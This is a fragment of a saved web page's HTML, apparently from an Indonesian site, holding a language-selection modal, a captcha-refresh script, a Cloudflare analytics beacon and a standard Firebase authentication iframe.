        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;733979b9c24043199561a4eac8bf2940&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771979141472" name="I0_1771979141472" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771979141472&amp;_gfid=I0_1771979141472&amp;parent=https%3A%2F%2FmerdekaMERCUSUAR77.site&amp;pfname=&amp;rpctoken=39952833" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>